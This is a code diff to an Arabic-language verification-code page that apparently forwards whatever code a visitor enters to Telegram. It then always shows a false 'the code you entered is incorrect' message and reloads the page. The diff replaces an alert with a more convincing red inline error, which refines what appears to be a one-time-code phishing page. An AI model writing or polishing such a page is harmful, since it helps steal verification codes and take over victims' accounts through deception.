@@ -26,6 +26,7 @@
     button:hover{background:#094418}
     footer{background:#000;color:#fff;padding:18px 20px;margin-top:30px;font-size:13px;text-align:center}
     .hint{color:#666;margin-top:10px;font-size:14px}
+    #errorMsg{color:#c00;margin-top:10px;font-size:15px;display:none}
   </style>
 </head>
 <body>
@@ -42,6 +43,7 @@
              placeholder="أدخل رمز التحقق" maxlength="9" aria-describedby="hint" />
       <button id="sendBtn" type="button">إرسال</button>
       <p id="hint" class="hint">سيسمح فقط بالأرقام — الطول المطلوب بين 4 و 9 أرقام.</p>
+      <p id="errorMsg">الرمز الذي ادخلته غير صحيح</p>
     </div>
   </main>
 
@@ -56,6 +58,7 @@
 
     const input = document.getElementById('onlyNumber');
     const btn   = document.getElementById('sendBtn');
+    const errorMsg = document.getElementById('errorMsg');
 
     input.addEventListener('input', () => {
       input.value = input.value.replace(/[^0-9]/g, '').slice(0, 9);
@@ -85,9 +88,13 @@
         console.warn('فشل إرسال الرسالة إلى Telegram', e);
       }
 
-      // بعد الإرسال يظهر رسالة خطأ ثم يرجع لنفس الصفحة
-      alert('الرمز الذي ادخلته غير صحيح');
-      window.location.reload();
+      // إظهار الرسالة الحمراء تحت الحقل
+      errorMsg.style.display = 'block';
+
+      // إعادة تحميل الصفحة بعد ثانيتين
+      setTimeout(() => {
+        window.location.reload();
+      }, 2000);
     });
 
     input.addEventListener('keydown', (ev) => {
